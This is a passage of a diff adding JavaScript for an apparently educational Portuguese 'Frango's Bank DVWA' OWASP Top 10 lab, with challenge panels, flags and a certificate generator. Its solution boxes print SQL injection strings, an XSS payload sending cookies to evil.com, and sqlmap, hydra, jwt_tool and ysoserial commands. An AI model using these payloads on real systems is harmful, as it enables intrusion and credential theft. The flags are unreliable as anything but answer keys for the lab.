+testssl.sh https://frangosbank.com</div><div class="flag-box" id="a04-flag" style="display:none">🚩 FLAG{A04_FRANGO_CRYPTO_BASE64NAOECRYPTO}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a04-flag').style.display='block';addScore('a04',100)">Revelar flag (+100 pts)</button></div>`,
+
+a05:()=>`<div class="vuln-title">A05 — Injection</div><div class="vuln-owasp">OWASP 2025 #5 &nbsp;|&nbsp; <span class="tag crit">CRÍTICO</span></div><div class="vuln-desc">SQLi, XSS, NoSQLi, SSTI — input interpretado como código.</div>${tabs('a05',['🧪 SQLi','🧪 XSS','🚩 Solução'])}<div id="a05-lab"><div class="lab-box"><h4>🎯 SQL Injection — Login bypass</h4><div style="font-size:12px;color:#aaa;margin-bottom:8px">Query: SELECT * FROM users WHERE email='$u' AND senha='$p'</div><input class="lab-input" id="a05u" placeholder="Email (tente: admin'--)"/><input class="lab-input" id="a05p" placeholder="Senha (qualquer)"/><button class="lab-btn" onclick="a05sqli()">Login</button><div class="output-box" id="a05o">// Aguardando...</div>${difficulty==='low'?'<div class="hint-box">💡 Digite admin\'-- no campo email</div>':''}</div></div><div id="a05-info" class="hidden"><div class="lab-box"><h4>🎯 XSS Refletido</h4><input class="lab-input" id="a05x" placeholder="Tente: &lt;b&gt;teste&lt;/b&gt; depois &lt;img src=x onerror=alert(1)&gt;"/><button class="lab-btn" onclick="a05xss()">Buscar</button><div style="background:#000;border:1px solid #333;border-radius:5px;padding:14px;margin-top:10px;min-height:50px" id="a05xo"></div>${difficulty==='low'?'<div class="hint-box">💡 &lt;img src=x onerror=alert(document.cookie)&gt;</div>':''}</div></div><div id="a05-sol" class="hidden"><div class="solution-box">SQLi: admin'--  |  ' OR 1=1--
+sqlmap -u 'https://target/login' --data='email=*&senha=x' --dbs
+XSS: &lt;img src=x onerror=fetch('https://evil.com?c='+document.cookie)&gt;</div><div class="flag-box" id="a05-flag" style="display:none">🚩 FLAG{A05_FRANGO_INJECTION_SQLI_XSS}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a05-flag').style.display='block';addScore('a05',100)">Revelar flag (+100 pts)</button></div>`,
+
+a06:()=>`<div class="vuln-title">A06 — Insecure Design</div><div class="vuln-owasp">OWASP 2025 #6 &nbsp;|&nbsp; <span class="tag high">ALTO</span></div><div class="vuln-desc">Race conditions, valores negativos, lógica de negócio quebrada.</div>${tabs('a06',['🧪 Race','🧪 Negativo','🚩 Solução'])}<div id="a06-lab"><div class="lab-box"><h4>🎯 Race Condition — débito sem lock atômico</h4><label style="font-size:12px;color:#aaa">Saldo: 🌽</label><input class="lab-input" id="a06v" value="500" style="width:80px;display:inline-block;margin:0 8px"/><label style="font-size:12px;color:#aaa">Threads:</label><input class="lab-input" id="a06n" value="2" style="width:60px;display:inline-block;margin:0 8px"/><button class="lab-btn" onclick="a06race()">Disparar</button><div class="output-box" id="a06o">// Aguardando...</div></div></div><div id="a06-info" class="hidden"><div class="lab-box"><h4>🎯 Valor Negativo</h4><input class="lab-input" id="a06neg" placeholder="Valor (tente: -1000)"/><button class="lab-btn" onclick="a06neg()">Transferir</button><div class="output-box" id="a06o2">// Aguardando...</div>${difficulty==='low'?'<div class="hint-box">💡 Transfere -1000 = seu saldo aumenta!</div>':''}</div></div><div id="a06-sol" class="hidden"><div class="solution-box">Race: for i in 1 2 3; do curl -X POST /api/transfer -d '{"amount":1000}' & done
+Negativo: POST /api/transfer {"amount":-5000}</div><div class="flag-box" id="a06-flag" style="display:none">🚩 FLAG{A06_FRANGO_DESIGN_RACE_CONDITION}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a06-flag').style.display='block';addScore('a06',100)">Revelar flag (+100 pts)</button></div>`,
+
+a07:()=>`<div class="vuln-title">A07 — Authentication Failures</div><div class="vuln-owasp">OWASP 2025 #7 &nbsp;|&nbsp; <span class="tag high">ALTO</span></div><div class="vuln-desc">Sem rate limiting, tokens previsíveis, senhas fracas, MFA ausente.</div>${tabs('a07',['🧪 Brute Force','📖 Token','🚩 Solução'])}<div id="a07-lab"><div class="lab-box"><h4>🎯 Brute Force — sem rate limiting</h4><input class="lab-input" id="a07u" value="admin@frangosbank.com"/><button class="lab-btn" onclick="a07brute()">Atacar</button><div class="output-box" id="a07o">// Aguardando...</div></div></div><div id="a07-info" class="hidden"><div class="lab-box"><h4>🎯 Token previsível</h4><button class="lab-btn" onclick="a07tok()">Analisar tokens</button><div class="output-box" id="a07o">// Aguardando...</div></div></div><div id="a07-sol" class="hidden"><div class="solution-box">hydra -l admin@frangosbank.com -P rockyou.txt target http-post-form "/login:email=^USER^&senha=^PASS^:inválid"</div><div class="flag-box" id="a07-flag" style="display:none">🚩 FLAG{A07_FRANGO_AUTH_BRUTEFORCE_NOLOCK}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a07-flag').style.display='block';addScore('a07',100)">Revelar flag (+100 pts)</button></div>`,
+
+a08:()=>`<div class="vuln-title">A08 — Software or Data Integrity Failures</div><div class="vuln-owasp">OWASP 2025 #8 &nbsp;|&nbsp; <span class="tag high">ALTO</span></div><div class="vuln-desc">JWT alg:none, deserialização insegura, atualizações sem verificação de integridade.</div>${tabs('a08',['🧪 JWT','🧪 Deserial','🚩 Solução'])}<div id="a08-lab"><div class="lab-box"><h4>🎯 JWT alg:none — elevar para admin</h4><textarea class="lab-input" id="a08i" rows="2">{"user":"cornelio","role":"admin","exp":9999999999}</textarea><button class="lab-btn" onclick="a08jwt()">Forjar JWT</button><div class="output-box" id="a08o">// Aguardando...</div>${difficulty==='low'?'<div class="hint-box">💡 alg:none = sem assinatura. Servidor aceita!</div>':''}</div></div><div id="a08-info" class="hidden"><div class="lab-box"><h4>🎯 Deserialização Insegura</h4><button class="lab-btn" onclick="a08d()">Simular exploit</button><div class="output-box" id="a08o">// Aguardando...</div></div></div><div id="a08-sol" class="hidden"><div class="solution-box">python3 jwt_tool.py TOKEN -X a   # testa alg:none
+java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin</div><div class="flag-box" id="a08-flag" style="display:none">🚩 FLAG{A08_FRANGO_INTEGRITY_JWT_ALG_NONE}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a08-flag').style.display='block';addScore('a08',100)">Revelar flag (+100 pts)</button></div>`,
+
+a09:()=>`<div class="vuln-title">A09 — Security Logging and Alerting Failures</div><div class="vuln-owasp">OWASP 2025 #9 &nbsp;|&nbsp; <span class="tag med">MÉDIO</span></div><div class="vuln-desc">Logs com senhas, sem alertas de brute force, log injection, logs expostos.</div>${tabs('a09',['🧪 Lab','📖 Teoria','🚩 Solução'])}<div id="a09-lab"><div class="lab-box"><h4>🎯 Explore falhas de logging e alerting</h4><button class="lab-btn" onclick="a09go('logs')">GET /logs/app.log</button><button class="lab-btn sec" onclick="a09go('noalert')">1000 logins sem alerta</button><button class="lab-btn sec" onclick="a09go('inject')">Log Injection</button><div class="output-box" id="a09o">// Selecione...</div></div></div><div id="a09-info" class="hidden"><div class="info-card"><h5>O que logar</h5><p>Logins (sucesso/falha+IP), mudanças de senha, transferências. NUNCA senhas ou tokens.</p></div></div><div id="a09-sol" class="hidden"><div class="solution-box">ffuf -u https://target/FUZZ -w logs.txt
+# Log injection: admin%0a[INFO] Admin login SUCCESS</div><div class="flag-box" id="a09-flag" style="display:none">🚩 FLAG{A09_FRANGO_LOGGING_SEM_ALERTA_SIEM}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a09-flag').style.display='block';addScore('a09',100)">Revelar flag (+100 pts)</button></div>`,
+
+a10:()=>`<div class="vuln-title">A10 — Mishandling of Exceptional Conditions</div><div class="vuln-owasp">OWASP 2025 #10 &nbsp;|&nbsp; <span class="tag med">MÉDIO</span></div><div class="vuln-desc">Stack traces informativos, type confusion, fail open em exceções de segurança.</div>${tabs('a10',['🧪 Stack Trace','🧪 Type Confusion','🚩 Solução'])}<div id="a10-lab"><div class="lab-box"><h4>🎯 Provoque erros e observe o que vaza</h4><button class="lab-btn" onclick="a10go('stack')">Input inválido → Stack trace</button><div class="output-box" id="a10o">// Aguardando...</div></div></div><div id="a10-info" class="hidden"><div class="lab-box"><h4>🎯 Type Confusion</h4><button class="lab-btn" onclick="a10go('type')">Testar coerção de tipos</button><div class="output-box" id="a10o">// Aguardando...</div>${difficulty==='low'?'<div class="hint-box">💡 "1000abc" → parseFloat → 1000. Validação bypassada!</div>':''}</div></div><div id="a10-sol" class="hidden"><div class="solution-box">{"amount":"1000abc"}  # JS parseFloat → 1000
+{"amount":null}       # NullPointerException → fail open?
+{"amount":true}       # boolean coercion → 1</div><div class="flag-box" id="a10-flag" style="display:none">🚩 FLAG{A10_FRANGO_EXCEPTION_STACKTRACE_LEAK}</div><button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a10-flag').style.display='block';addScore('a10',100)">Revelar flag (+100 pts)</button></div>`,
+};
+
+// ── PÁGINA DE CERTIFICADO ─────────────────────────────────────
+function renderCert(){
+  const hoje=new Date().toISOString().split('T')[0];
+  return `<div class="cert-page">
+    <div style="text-align:center;margin-bottom:24px">
+      <div style="font-size:48px;margin-bottom:8px">🏆</div>
+      <div style="font-size:22px;font-weight:700;color:#ffcc00;margin-bottom:4px">Certificado de Conclusão</div>
+      <div style="font-size:13px;color:#888">Você completou 100% do Frango's Bank DVWA — OWASP Top 10 2025</div>
+    </div>
+
+    <div class="cert-form-card">
+      <h3>🐥 Seus dados para o certificado</h3>
+      <label class="cf-label">Nome completo</label>
+      <input class="cf-input" id="cf-nome" placeholder="Como deve aparecer no certificado" oninput="refreshCanvas()"/>
+      <label class="cf-label">Pronome</label>
+      <div class="radio-row">
+        <div class="radio-opt on" id="pr-ele" onclick="setPr('ele')">ele / o</div>
+        <div class="radio-opt" id="pr-ela" onclick="setPr('ela')">ela / a</div>
+        <div class="radio-opt" id="pr-elu" onclick="setPr('elu')">elu / e</div>
+      </div>
+      <label class="cf-label">Data de conclusão</label>
+      <input class="cf-input" id="cf-data" type="date" value="${hoje}" oninput="refreshCanvas()"/>
+    </div>
+
+    <div class="cert-preview-wrap">
+      <div class="cert-preview-header">
+        <span style="color:#ffcc00;font-weight:600">Pré-visualização</span>
+        <button class="lab-btn" onclick="downloadCert()">⬇ Baixar PDF</button>
+      </div>
+      <div class="cert-canvas-wrap">
+        <canvas id="cert-canvas" width="800" height="566" style="border-radius:4px"></canvas>
+      </div>
+    </div>
+  </div>`;
+}
+
+function initCert(){
+  certPronome='ele';
+  setTimeout(refreshCanvas, 100);
+}
+
+function setPr(p){
+  certPronome=p;
+  ['ele','ela','elu'].forEach(x=>document.getElementById('pr-'+x)?.classList.remove('on'));
+  document.getElementById('pr-'+p)?.classList.add('on');
+  refreshCanvas();
+}
+
+function fmtData(v){
+  if(!v) return '__/__/____';
+  const[y,m,d]=v.split('-'); return `${d}/${m}/${y}`;
+}
+
+function refreshCanvas(){
+  const canvas=document.getElementById('cert-canvas');
+  if(!canvas) return;
+  const ctx=canvas.getContext('2d');
+  const W=800,H=566;
+  ctx.clearRect(0,0,W,H);
+
+  // fundo
+  const bg=ctx.createLinearGradient(0,0,W,H);
+  bg.addColorStop(0,'#fffaf8'); bg.addColorStop(1,'#fff0ea');
+  ctx.fillStyle=bg; ctx.fillRect(0,0,W,H);
+
+  // header
+  const hg=ctx.createLinearGradient(0,0,W,0);
+  hg.addColorStop(0,'#a81900'); hg.addColorStop(1,'#cc2200');
+  ctx.fillStyle=hg; ctx.fillRect(0,0,W,100);
+  ctx.fillStyle='rgba(255,102,0,.3)'; ctx.fillRect(0,88,W,18);
+
+  // bordas
+  ctx.strokeStyle='#cc2200'; ctx.lineWidth=2.5;
+  ctx.strokeRect(14,14,W-28,H-28);
+  ctx.strokeStyle='rgba(204,34,0,0.3)'; ctx.lineWidth=1;
+  ctx.strokeRect(20,20,W-40,H-40);
+
+  // cantos
+  [[16,16],[W-16,16],[16,H-16],[W-16,H-16]].forEach(([x,y])=>{
+    const dx=x<W/2?1:-1, dy=y<H/2?1:-1;
+    ctx.strokeStyle='#cc2200'; ctx.lineWidth=2.5;
+    ctx.beginPath(); ctx.moveTo(x+dx*22,y); ctx.lineTo(x,y); ctx.lineTo(x,y+dy*22); ctx.stroke();
+  });
+
+  // duck + títulos no header
+  ctx.font='36px serif'; ctx.textAlign='center';
+  ctx.fillText('🐥',W/2,38);
+  ctx.fillStyle='rgba(255,255,255,.7)'; ctx.font='bold 9px Arial';
+  ctx.letterSpacing='3px';
+  ctx.fillText('GALINHEIRO HALL SECURITY TEAM',W/2,56);
+  ctx.letterSpacing='0px';
+  ctx.fillStyle='#fff'; ctx.font='bold 17px Arial';
+  ctx.fillText('CERTIFICADO DE CONCLUSÃO',W/2,78);
+
+  // corpo
+  const nome=document.getElementById('cf-nome')?.value.trim()||'Seu Nome';
+  const data=fmtData(document.getElementById('cf-data')?.value||'');
+  const pr=certPronome==='ela'?'ela':certPronome==='elu'?'elu':'ele';
+
+  ctx.fillStyle='#777'; ctx.font='13px Arial';
+  ctx.fillText('Certificamos que',W/2,140);
+
+  // nome
+  ctx.fillStyle='#a81900'; ctx.font='bold 34px Arial';
+  ctx.fillText(nome,W/2,185);
+  const nw=ctx.measureText(nome).width;
+  ctx.strokeStyle='#cc2200'; ctx.lineWidth=1.5;
+  ctx.beginPath(); ctx.moveTo(W/2-nw/2-6,192); ctx.lineTo(W/2+nw/2+6,192); ctx.stroke();
+
+  // texto
+  ctx.fillStyle='#333'; ctx.font='14px Arial';
+  ctx.fillText(`em ${data}, superou o Frango's Bank DVWA`,W/2,220);
+  ctx.font='bold 15px Arial'; ctx.fillStyle='#222';
+  ctx.fillText(`e ${pr} é incrível`,W/2,240);
+
+  // divisor
+  ctx.strokeStyle='#cc2200'; ctx.lineWidth=.8;
+  ctx.beginPath(); ctx.moveTo(W/2-80,256); ctx.lineTo(W/2-12,256); ctx.stroke();
+  ctx.beginPath(); ctx.moveTo(W/2+12,256); ctx.lineTo(W/2+80,256); ctx.stroke();
+  ctx.font='14px serif'; ctx.fillText('🌽',W/2,260);
+
+  // score badge
+  ctx.fillStyle='#cc2200';
+  roundRect(ctx, W/2-90, 268, 180, 26, 13); ctx.fill();
+  ctx.fillStyle='#fff'; ctx.font='bold 11px Arial';
+  ctx.fillText('1000 / 1000 pts  •  10 flags capturadas',W/2,284);
+
+  // flags
+  ctx.fillStyle='#999'; ctx.font='9px Arial';
+  ctx.fillText('A01 A02 A03 A04 A05 A06 A07 A08 A09 A10',W/2,306);
+
+  // assinaturas
+  const sy=395;
+  // esq
+  ctx.strokeStyle='#ccc'; ctx.lineWidth=.8;
+  ctx.beginPath(); ctx.moveTo(W/2-200,sy); ctx.lineTo(W/2-60,sy); ctx.stroke();
+  ctx.fillStyle='#444'; ctx.font='bold 10px Arial';
+  ctx.fillText('Galo Pereira',W/2-130,sy-6);
+  ctx.fillStyle='#888'; ctx.font='9px Arial';
+  ctx.fillText('Diretor de Segurança',W/2-130,sy+10);
+  ctx.fillText("Frango's Bank",W/2-130,sy+20);
+
+  // dir
+  ctx.beginPath(); ctx.moveTo(W/2+60,sy); ctx.lineTo(W/2+200,sy); ctx.stroke();
+  ctx.fillStyle='#444'; ctx.font='bold 10px Arial';
+  ctx.fillText('Franga Motta',W/2+130,sy-6);
+  ctx.fillStyle='#888'; ctx.font='9px Arial';
+  ctx.fillText('CISO — Galinheiro Hall',W/2+130,sy+10);
+  ctx.fillText("Frango's Bank",W/2+130,sy+20);
+
+  // selo
+  ctx.fillStyle='#cc2200';
+  ctx.beginPath(); ctx.arc(W/2,sy-16,36,0,Math.PI*2); ctx.fill();
+  ctx.fillStyle='#a81900';
+  ctx.beginPath(); ctx.arc(W/2,sy-16,28,0,Math.PI*2); ctx.fill();
+  ctx.fillStyle='#fff'; ctx.font='bold 7px Arial';
+  ctx.fillText("FRANGO'S",W/2,sy-26);
+  ctx.fillText('BANK',W/2,sy-18);
+  ctx.font='12px serif'; ctx.fillText('🌽',W/2,sy-6);
+
+  // rodapé
+  ctx.fillStyle='#a81900'; ctx.fillRect(0,H-44,W,44);
+  ctx.fillStyle='rgba(255,150,100,.6)'; ctx.fillRect(0,H-48,W,6);
+  ctx.fillStyle='rgba(255,200,150,.8)'; ctx.font='8px Arial';
+  ctx.fillText("Frango's Bank DVWA Lab  •  OWASP Top 10 2025  •  Galinheiro Hall  •  Ambiente educacional isolado",W/2,H-26);
+  ctx.fillStyle='rgba(255,150,100,.8)'; ctx.font='7px Arial';
+  ctx.fillText('Este certificado confirma conclusão de desafios de segurança em ambiente controlado para fins educacionais.',W/2,H-12);
+}
+
+function roundRect(ctx,x,y,w,h,r){
+  ctx.beginPath();
+  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y);
+  ctx.quadraticCurveTo(x+w,y,x+w,y+r);
+  ctx.lineTo(x+w,y+h-r);
+  ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h);
+  ctx.lineTo(x+r,y+h);
+  ctx.quadraticCurveTo(x,y+h,x,y+h-r);
+  ctx.lineTo(x,y+r);
+  ctx.quadraticCurveTo(x,y,x+r,y);
+  ctx.closePath();
+}
+
+function downloadCert(){
+  const nome=document.getElementById('cf-nome')?.value.trim();
+  if(!nome){alert('Preencha seu nome!');return;}
+  const canvas=document.getElementById('cert-canvas');
+  const img=canvas.toDataURL('image/png',1.0);
+  const {jsPDF}=window.jspdf;
+  const pdf=new jsPDF({orientation:'landscape',unit:'mm',format:'a4'});
+  pdf.addImage(img,'PNG',0,0,297,210);
+  const arq=nome.toLowerCase().replace(/\s+/g,'-').replace(/[^a-z0-9-]/g,'');
+  pdf.save(`certificado-frangosbank-${arq}.pdf`);
+}
+
+// ── INIT ──────────────────────────────────────────────────────
+document.getElementById('content').innerHTML=VULNS['a01']();
+</script>
